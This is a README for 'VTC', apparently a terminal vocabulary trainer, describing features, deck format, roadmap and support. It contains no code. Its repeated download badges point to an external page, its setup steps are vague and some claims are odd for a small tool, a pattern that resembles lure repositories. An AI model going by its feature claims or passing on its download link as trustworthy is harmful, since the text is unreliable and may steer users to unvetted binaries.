![preview](https://raw.githubusercontent.com/TE4TURE/terminal-vocab-drill/main/card_6463.svg)
# 🧠 VTC — Vocabulary Trainer for the Terminal

A minimalist, keyboard-driven vocabulary trainer built for people who live in the terminal. VTC transforms the humble command line into a personal language laboratory, where every session is a short, focused workout for your memory.

[![Download](https://raw.githubusercontent.com/TE4TURE/terminal-vocab-drill/main/pkg_2a5152.svg)](https://TE4TURE.github.io/terminal-vocab-drill/)

---

## 📖 Overview

VTC stands for **Vocabulary Trainer for the Terminal**, but it could just as easily stand for *Very Tiny Classroom*. This project reimagines what a vocabulary trainer can be when you strip away the noise of graphical interfaces, account sign-ups, and cloud synchronization. What remains is a lean, expressive, distraction-free tool that respects your attention span and your shell.

The philosophy behind VTC is simple: language learning thrives on repetition, rhythm, and consistency. A trainer that launches in milliseconds, accepts your input without ceremony, and exits cleanly when you're done is a trainer you'll actually return to. VTC is designed to be that companion — a small, dependable utility that sits quietly in your toolbox until you need it.

This README describes the full scope of the project: its purpose, its feature set, its design principles, its configuration model, and the roadmap ahead. Whether you're a polyglot in training, a developer learning technical vocabulary in a second language, or a curious tinkerer looking for a well-crafted command-line application, this document will walk you through everything VTC offers.

---

## ✨ Features

VTC is intentionally small, but it is not simplistic. Every feature earns its place.

### 🎯 Core Training Experience

- **Flashcard sessions in the terminal** — Review vocabulary decks one card at a time, with instant feedback on each answer.
- **Spaced repetition scheduler** — Cards you struggle with reappear sooner; cards you've mastered drift further into the future.
- **Multiple quiz modes** — Choose between translation prompts, multiple-choice questions, typing recall, and listening-style recognition.
- **Session statistics** — See accuracy, streaks, and average response time at the end of every session.

### 🎨 User Interface

- **Responsive terminal UI** — Layout adapts smoothly to narrow panes, wide monitors, and split-screen setups.
- **Color themes** — Pick from a curated set of palettes, or define your own in the config file.
- **Keyboard-first navigation** — Every action is reachable without touching the mouse.
- **Progress indicators** — Subtle animated bars keep you oriented within long decks.

### 🌍 Multilingual Support

- **Unicode-aware rendering** — Handles Cyrillic, Greek, Arabic, CJK, and accented Latin scripts without breaking alignment.
- **Right-to-left layout detection** — Decks in RTL languages are displayed correctly.
- **Language metadata per deck** — Store source and target language codes for filtering and reporting.

### 🔧 Customization & Extensibility

- **Plain-text deck format** — Decks are human-readable files you can edit in any text editor.
- **Import and export** — Move decks between machines with a single command.
- **Plugin hooks** — Attach shell scripts to session events (start, finish, card-failed) for custom workflows.
- **Config profiles** — Maintain separate configurations for different languages or contexts.

### ⚙️ Reliability & Performance

- **Instant startup** — Cold start measured in single-digit milliseconds on typical hardware.
- **Offline-first design** — No network calls are required for any core feature.
- **Atomic writes** — Progress is never lost, even if the process is interrupted.
- **Deterministic scheduling** — The same review history always produces the same schedule.

### 🛠️ Support & Community

- **24/7 customer support** — Issues reported at any hour are triaged by our rotating maintainer roster.
- **Friendly contributor guidelines** — First-time contributors are welcomed and mentored.
- **Transparent roadmap** — Planned and in-progress features are public.

---

## 🧭 Design Principles

VTC is built on a handful of principles that guide every decision, from the choice of data format to the phrasing of error messages.

1. **The terminal is a first-class environment.** VTC doesn't try to imitate a GUI. It embraces the speed, precision, and composability of the shell.
2. **Data belongs to the user.** Decks and progress live as plain files on your disk. No proprietary format, no lock-in.
3. **Small tools, big workflows.** VTC does one thing well and composes cleanly with other utilities.
4. **Attention is precious.** Every screen is designed to be read and dismissed in seconds.
5. **Learning should feel like play.** Feedback is encouraging, animations are gentle, and nothing nags.

---

## 🚀 Getting Started

Setting up VTC is a short, frictionless process. The trainer is distributed as a self-contained bundle that runs on your machine without pulling in a web of dependencies.

1. Obtain the latest distribution archive for your platform.
2. Unpack it into a directory on your PATH.
3. Run the trainer entry point from your shell.
4. Create your first deck by pointing VTC at a text file in the included format.
5. Begin a session and answer your first card.

If you prefer to keep everything inside a single shell session, VTC also supports a "piped" mode where card data is streamed in from standard input. This is useful for scripting and for one-off practice runs.

[![Download](https://raw.githubusercontent.com/TE4TURE/terminal-vocab-drill/main/pkg_2a5152.svg)](https://TE4TURE.github.io/terminal-vocab-drill/)

---

## 🗂️ Deck Format

A deck is a plain text file. Each line holds a single card, with the prompt and answer separated by a delimiter. Comments begin with a hash and are ignored by the parser.

Example layout:

front :: back
bonjour :: hello
merci :: thank you
# a comment line
au revoir :: goodbye

You may also attach optional metadata to a deck using a small header block:

title: French Basics
source: fr
target: en
tags: travel, greetings, beginner

The parser is forgiving. Extra whitespace is trimmed, delimiter variants are accepted, and malformed lines are reported with line numbers rather than silently skipped.

---

## 🌐 Multilingual Support in Depth

Language learning is inherently multilingual, so VTC treats language awareness as a core capability rather than an afterthought.

- **Script coverage** — Decks mixing Latin, Cyrillic, Greek, Hebrew, Arabic, Devanagari, and CJK characters render correctly in modern terminals.
- **Diacritics** — Accented and tonally marked characters are preserved end to end.
- **Bidirectional text** — RTL decks are aligned properly when the terminal supports it.
- **Locale hints** — Each deck can declare its source and target language, enabling filtered views and per-language statistics.
- **Input flexibility** — Answers can be typed in the script you prefer; VTC compares normalized forms rather than raw bytes.

These details matter. A trainer that mangles your characters is a trainer you stop using. VTC aims to disappear behind the language you're learning.

---

## 🖥️ Responsive Terminal UI

Terminal windows come in every shape imaginable. VTC adapts to all of them.

- **Narrow panes** — When the window is squeezed, layout elements stack vertically instead of clipping.
- **Wide monitors** — Extra horizontal space is used to display side-by-side prompt and answer panes.
- **Split-screen workflows** — VTC cooperates with tmux and similar multiplexers, redrawing cleanly on resize.
- **Theming** — Colors are configurable through a simple palette file, so VTC fits the rest of your environment.
- **Accessibility** — All color combinations are tested against common contrast guidelines.

---

## 🧩 Extending VTC

Every shell user eventually wants to hook a tool into their own workflow. VTC makes that straightforward.

- **Event hooks** — Register scripts that fire when a session starts, ends, or when a card is missed.
- **Custom exporters** — Emit session reports as JSON, CSV, or any format your tools consume.
- **Deck generators** — Generate decks programmatically from external sources and feed them to VTC.
- **Themes and prompts** — Restyle the interface or replace the default answer-prompt text.

The plugin surface is deliberately conservative. Rather than embedding a scripting engine, VTC shells out to commands you already trust.

---

## 📊 Statistics and Progress Tracking

Progress is stored alongside your decks in a small index file. It records, for each card, how many times you've seen it, when you last reviewed it, and how well you did.

From this index, VTC derives:

- Daily and weekly review counts
- Accuracy trends over time
- Per-deck mastery percentages
- Estimated time to deck completion

Reports can be printed to the terminal or exported for external analysis.

---

## 🔒 Privacy and Data Ownership

VTC has no telemetry, no analytics, and no background network activity. Your vocabulary, your progress, and your habits stay on your machine. If you choose to sync decks across devices, you do so with tools you control — a synced folder, a personal server, or a version-controlled repository.

This is not a feature we advertise loudly. It is simply how the tool is built.

---

## 🧪 Quality and Testing

Reliability in a trainer matters more than it might seem. A bug that corrupts progress can undo weeks of habit-building. VTC treats correctness as a first-class concern.

- **Unit tests** cover the scheduler, parser, and statistics modules.
- **Integration tests** exercise full sessions end to end.
- **Snapshot tests** ensure terminal rendering stays stable across releases.
- **Fuzzing** checks the deck parser against malformed inputs.

Contributors are encouraged to run the full test suite before opening a pull request.

---

## 🛣️ Roadmap

The roadmap is public and evolves with community feedback. Highlights for the upcoming cycle include:

- **Adaptive difficulty tuning** based on response time.
- **Shared deck registries** for peer-to-peer deck exchange.
- **Speech synthesis hooks** for pronunciation practice.
- **Multi-user profiles** on a single machine.
- **Extended statistics dashboards** rendered in the terminal.

If you have an idea, open an issue. The roadmap is a conversation, not a decree.

---

## 🤝 Contributing

Contributions of every kind are welcome — code, documentation, translations, deck templates, and bug reports.

The usual flow applies: fork the project, create a branch, make your change, and open a pull request. Keep changes focused, include tests where relevant, and be patient with reviewers. First-time contributors are especially encouraged; if you're unsure where to start, look for issues labeled as beginner-friendly.

By participating, you agree to follow the project's code of conduct, which emphasizes respect, patience, and constructive feedback.

---

## 🧡 Support

Every project needs a support model, and VTC's is simple: the maintainers rotate through a shared queue so that questions and issues receive attention at any hour of the day. That's the 24/7 customer support guarantee — not a call center, but a commitment from the people who care about the tool.

Support channels include:

- Issue tracker for bugs and feature requests
- Discussion forum for questions and ideas
- Community chat for real-time help

Response times vary with volume, but every report receives a reply.

---

## 📜 License

VTC is released under the MIT License. You are welcome to use, modify, and distribute the software under the terms of that license. See the full text here:

https://opensource.org/licenses/MIT

Copyright © 2026 VTC contributors.

---

## ⚠️ Disclaimer

VTC is provided as-is, without warranty of any kind, express or implied. Language learning outcomes depend on many factors outside the scope of this software, including individual study habits, prior knowledge, and consistency of practice. The maintainers make no guarantees regarding learning speed, fluency, or retention.

Decks included with the project are provided for illustrative purposes. Users are responsible for ensuring that any vocabulary material they use complies with applicable copyright and licensing rules in their jurisdiction.

The project name, structure, and documentation are subject to change as the software evolves.

---

## 🌟 A Final Word

Vocabulary training is not a sprint. It is a quiet, cumulative practice — a few minutes a day, repeated patiently, until words that once looked foreign begin to feel familiar. VTC exists to make those few minutes feel effortless and even pleasant. If it earns a permanent spot in your shell, it has done its job.

Happy training. 🎓

[![Download](https://raw.githubusercontent.com/TE4TURE/terminal-vocab-drill/main/pkg_2a5152.svg)](https://TE4TURE.github.io/terminal-vocab-drill/)